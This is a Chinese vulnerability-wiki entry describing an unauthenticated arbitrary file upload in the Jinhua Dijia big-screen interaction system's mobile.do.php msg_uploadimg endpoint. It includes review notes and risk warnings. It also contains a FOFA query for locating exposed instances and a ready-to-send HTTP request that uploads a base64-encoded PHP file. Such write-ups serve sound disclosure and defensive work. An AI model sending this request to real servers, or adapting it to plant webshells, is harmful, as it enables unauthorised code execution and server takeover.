---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "金华迪加现场大屏互动系统 mobile.do msg_uploadimg任意上传"
product: "金华迪加现场大屏互动系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，PHP可执行图片目录"
prerequisites: "匿名声称"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%87%91%E5%8D%8E%E8%BF%AA%E5%8A%A0%E5%A4%A7%E5%B1%8F/%E9%87%91%E5%8D%8E%E8%BF%AA%E5%8A%A0%20%E7%8E%B0%E5%9C%BA%E5%A4%A7%E5%B1%8F%E4%BA%92%E5%8A%A8%E7%B3%BB%E7%BB%9F%20mobile.do.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/wall/themes/meepo/assets/images/defaultbg.jpg\" || title=\"现场活动大屏幕系统\""
id: "vw-eb97872aeaea795ca08fac7b"
entity_id: "ve-eb97872aeaea795ca08fac7b"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 金华迪加现场大屏互动系统 mobile.do msg_uploadimg任意上传

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：金华迪加现场大屏互动系统；mobile.do msg_uploadimg任意上传
- 版本、配置及部署条件：未知版本，PHP可执行图片目录
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 静态解码Base64为phpinfo并自删除，已读其内容未执行；输出系统信息具有泄露风险
- 上传路径/执行只在未视检图；在野及版本/修复缺证，HTTP无围栏

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

金华迪加 现场大屏互动系统 mobile.do.php 存在任意文件上传漏洞，未经身份验证远程攻击者可利用该漏洞代码执行，写入WebShell,进一步控制服务器权限。

## 影响版本

现场大屏互动系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"

POC/EXP：

```http
POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close

filetype=php&imgbase64=PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=
```


![image-20241101211512032](./.resource/金华迪加现场大屏互动系统mobile.do.php任意文件上传漏洞/media/image-20241101211512032.png)


![image-20241101211543542](./.resource/金华迪加现场大屏互动系统mobile.do.php任意文件上传漏洞/media/image-20241101211543542.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
